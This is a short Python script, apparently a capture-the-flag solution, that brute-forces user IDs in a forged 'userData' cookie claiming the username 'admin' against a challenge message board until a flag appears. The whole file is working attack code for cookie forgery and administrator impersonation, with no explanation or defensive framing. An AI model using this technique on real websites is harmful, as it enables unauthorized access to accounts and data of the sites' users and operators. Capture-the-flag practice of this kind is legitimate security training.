import requests

for i in range(1000):
    print(i)
    start = i
    r = requests.get("https://message-board.hsc.tf/", cookies={"userData": f"j%3A%7B%22userID%22%3A%22{i}%22%2C%22username%22%3A%22admin%22%7D"})
    if ("flag{" in r.text) or (r.status_code != 200):
        print(r.text)
        break